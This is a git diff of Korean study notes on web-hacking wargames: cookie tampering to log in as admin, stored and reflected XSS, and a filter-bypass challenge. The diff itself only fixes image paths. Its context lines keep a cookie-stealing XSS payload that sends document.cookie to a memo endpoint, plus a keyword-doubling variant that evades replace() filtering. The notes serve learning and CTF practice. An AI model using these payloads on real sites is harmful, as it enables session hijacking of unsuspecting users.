@@ -100,8 +100,8 @@ app.run(host='0.0.0.0', port=8000)
 	- pw를 users 배열에서 확인하고 입력한 비밀번호랑 맞으면 쿠키를 설정함
 
  ![login_page][./images/20230818171908.png]
-![guest_login](20230818172344.png)
-![set_cookie_admin](Pasted%20image%2020230818172513.png)
+![guest_login](./images/20230818172344.png)
+![set_cookie_admin](./images/Pasted%20image%2020230818172513.png)
 - users에 guest/guest 가 있으니 이 계정으로 로그인해서 쿠키를 설정하고 값을 admin 으로 바꾸면 됨
 - 쿠키에 username: admin으로 직접 설정해도 됨 
 
@@ -155,10 +155,10 @@ XSS: 공격자가 웹 리소스에 악성 스크립트를 삽입하고 이용자
 
 ex)
 게시물과 댓글에 악성 스크립트를 포함해 업로드 하는 방식.
-![stored-xss-1](Pasted%20image%2020230820143448.png)
+![stored-xss-1](./images/Pasted%20image%2020230820143448.png)
 - body에 스크립트 태그 삽입
 
-![xss-stored-2](Pasted%20image%2020230820143530.png)
+![xss-stored-2](./images/Pasted%20image%2020230820143530.png)
 - 게시글 읽어올때 스크립트 태그 실행
 
 ### Reflected XSS
@@ -168,13 +168,13 @@ ex)
 - click jacking 혹은 open redirect 등 다른 취약점과 연계해서 사용
 
 ex) 쿼리를 사용해서 게시물을 조회하는 기능
-![reflected-xss-1](Pasted%20image%2020230820143931.png)
+![reflected-xss-1](./images/Pasted%20image%2020230820143931.png)
 - 쿼리에 스크립트 삽입
 
-![reflected-xss-2](Pasted%20image%2020230820143944.png)
+![reflected-xss-2](./images/Pasted%20image%2020230820143944.png)
 - 서버에서 리턴될때 스크립트 실행
 
-![reflected-xss-3](Pasted%20image%2020230820144032.png)
+![reflected-xss-3](./images/Pasted%20image%2020230820144032.png)
 - 다른 태그도 삽입 가능
 
 ### 해결방법
@@ -189,8 +189,8 @@ xss-2와 비슷한 문제이므로 풀이 패스
 
 xss-2:
 
-![wargame-xss-2-main](Pasted%20image%2020230820161237.png)
-![wargame-xss-2-flag](Pasted%20image%2020230820161345.png)
+![wargame-xss-2-main](./images/Pasted%20image%2020230820161237.png)
+![wargame-xss-2-flag](./images/Pasted%20image%2020230820161345.png)
 
 소스코드
 ```python
@@ -308,7 +308,7 @@ def vuln():
 필터링(replace)한 이후 값을 다음과 같이 나오게만 하면 됨
 - `<script>location.href='http://127.0.0.1:8000/memo?memo='+document.cookie</script>`
 - flag 입력값: `<scripscriptt>locatioonn.href='http://127.0.0.1:8000/memo?memo='+document.cookie</scripscriptt>`
-![xss-filtering-flag](Pasted%20image%2020230820172422.png)
+![xss-filtering-flag](./images/Pasted%20image%2020230820172422.png)
 
 ## Cross Site Request Forgery
 
